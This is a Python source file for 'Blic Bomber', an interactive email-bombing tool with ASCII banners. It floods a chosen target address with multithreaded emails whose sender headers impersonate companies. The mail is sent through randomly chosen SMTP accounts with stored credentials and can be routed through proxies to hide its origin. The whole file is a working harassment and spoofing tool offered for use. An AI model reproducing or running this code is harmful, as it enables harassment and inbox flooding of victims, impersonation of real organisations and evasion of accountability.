import shutil
import ctypes
import random
import socket
import socks
import time
import os

import fade
from rich.console import *
from rich.progress import Progress
from colorama import *

import inquirer
from questions import questions
from utils import get_proxies

import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

banner = """
██████╗ ██╗     ██╗ ██████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██║     ██║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║     ██║██║         ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║     ██║██║         ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝███████╗██║╚██████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝ ╚══════╝╚═╝ ╚═════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

           _____
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~```````````````##(_))#H\`````Y########
                          ))    \#H\       `Y###
                      }#H)"""

ioBanner = """
██╗███╗   ██╗██╗   ██╗ █████╗ ██╗     ██╗██████╗ 
██║████╗  ██║██║   ██║██╔══██╗██║     ██║██╔══██╗
██║██╔██╗ ██║██║   ██║███████║██║     ██║██║  ██║
██║██║╚██╗██║╚██╗ ██╔╝██╔══██║██║     ██║██║  ██║
██║██║ ╚████║ ╚████╔╝ ██║  ██║███████╗██║██████╔╝
╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ 
                                                 
 ██████╗ ██████╗ ████████╗██╗ ██████╗ ███╗   ██╗ 
██╔═══██╗██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║ 
██║   ██║██████╔╝   ██║   ██║██║   ██║██╔██╗ ██║ 
██║   ██║██╔═══╝    ██║   ██║██║   ██║██║╚██╗██║ 
╚██████╔╝██║        ██║   ██║╚██████╔╝██║ ╚████║ 
 ╚═════╝ ╚═╝        ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ 

"""

center = shutil.get_terminal_size().columns

try:
    kernel = ctypes.windll.kernel32.SetConsoleTitleW
except:
    print("[yellow]ctypes.windll is not supported on linux. it is purely for esthetic reasons, you can ignore this.")

r = Fore.RED
m = Fore.MAGENTA
rst = Fore.RESET

class Stats:
    sent = 0
    failed = 0

class Bomber:
    def __init__(self) -> None:
        self.cBanner = "\n".join(line.center(center) for line in banner.splitlines())
        self.ioCBanner = "\n".join(line.center(center) for line in ioBanner.splitlines())
        self.cool_graphics()
        self.answers = inquirer.prompt(questions)
        self.target = self.answers["target"]
        self.amount = int(self.answers["amount"])
        self.delay = int(self.answers["delay"])
        self.debug = self.answers["debug"]
        self.error_message = "An error occurred:\n"
        self.use_proxies = self.answers["proxies"]
        self.progress = Progress()
        self.progress_task = self.progress.add_task("[cyan]Sending Emails...", total=self.amount)
        self.progress_lock = threading.Lock()
        self.threads = []
        if self.use_proxies:
            self.available_proxies = get_proxies()
        

    def clear(self) -> None:
        os.system("cls" if os.name == "nt" else "clear")

    def cool_graphics(self) -> None:
        self.clear()
        try:
            kernel(f"Blic Bomber   |   Sent: {Stats.sent}  Failed: {Stats.failed}   |   Proxy: {'Active' if self.use_proxies == 'yes' else 'None'}   |   Python Version: {platform.python_version()}")
        except:
            pass
        print(fade.purplepink(self.cBanner))

    def bomb(self) -> None:
        try:
            with open('transcripts/config.json', 'r') as f:
                config_data = json.load(f)

            from_list = config_data.get('From', {})
            subject_list = config_data.get('Subject', {})
            body_list = config_data.get('Bodies', {})

            msg = MIMEMultipart("related")

            random_company = random.choice(list(from_list.keys()))
            company_info = from_list.get(random_company, {})

            spoofed_name = company_info.get('Name', '')
            spoofed_email = company_info.get('Email', '')

            random_subject = random.choice(list(subject_list.values()))
            random_body = random.choice(list(body_list.values()))

            msg['From'] = f"{spoofed_name} <{spoofed_email}>"
            msg['To'] = self.target
            msg['Subject'] = random_subject
            msg.attach(MIMEText(random_body, 'plain'))

            with open("transcripts/smtps.json", "r") as f:
                smtp_data = json.load(f)

            service_name = random.choice(list(smtp_data.keys()))
            service_data = smtp_data[service_name]

            smtp_host = service_data["smtp_server"]
            smtp_port = service_data["smtp_port"]

            user_id = random.choice([key for key in service_data["registered_users"] if key.isdigit()])
            user_data = service_data["registered_users"][user_id]

            smtp_username = user_data['user']
            smtp_password = user_data['smtp_password']

            if self.use_proxies.lower() in ["yes", "y"]:
                if self.available_proxies:
                    proxy = random.choice(self.available_proxies)
                    proxy_ip = proxy.split(":")[0]
                    proxy_port = int(proxy.split(":")[1])
                else:
                    print("Do not select to use proxies if your settings/proxies.txt is empty.")
                    os._exit(1)

                for proxy_type in [socks.SOCKS5, socks.SOCKS4, socks.HTTP]:
                    try:
                        with smtplib.SMTP(smtp_host, smtp_port) as server:
                            server.sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                            server.sock.set_proxy(proxy_type, proxy_ip, proxy_port)
                            server.starttls()
                            server.login(smtp_username, smtp_password)
                            text = msg.as_string()
                            server.sendmail(from_addr=spoofed_email, to_addrs=self.target, msg=text)            
                            Stats.sent += 1
                            self.progress.update(self.progress_task, completed=Stats.sent)
                            break
                    except Exception as e:
                        if self.debug.lower() in ["yes", "y"]:
                            print(self.error_message, e)
                        Stats.failed += 1

            else:
                try:
                    with smtplib.SMTP(smtp_host, smtp_port) as server:
                        server.starttls()
                        server.login(smtp_username, smtp_password)
                        text = msg.as_string()
                        server.sendmail(from_addr=spoofed_email, to_addrs=self.target, msg=text)
                        Stats.sent += 1
                        self.progress.update(self.progress_task, completed=Stats.sent)
                except Exception as e:
                    if self.debug.lower() in ["yes", "y"]:
                        print(self.error_message, e)
                    Stats.failed += 1

        except Exception as e:
            if self.debug.lower() in ["yes", "y"]:
                print(self.error_message, e)
            pass

    def start(self) -> None:
        with self.progress:
            for _ in range(self.amount):
                try:
                    thread = threading.Thread(target=self.bomb)
                    self.threads.append(thread)
                    thread.start()
                except Exception as e:
                    if self.debug.lower() in ["yes", "y"]:
                        print(self.error_message, e)
                    pass

                time.sleep(self.delay)

        for thread in self.threads:
            thread.join()
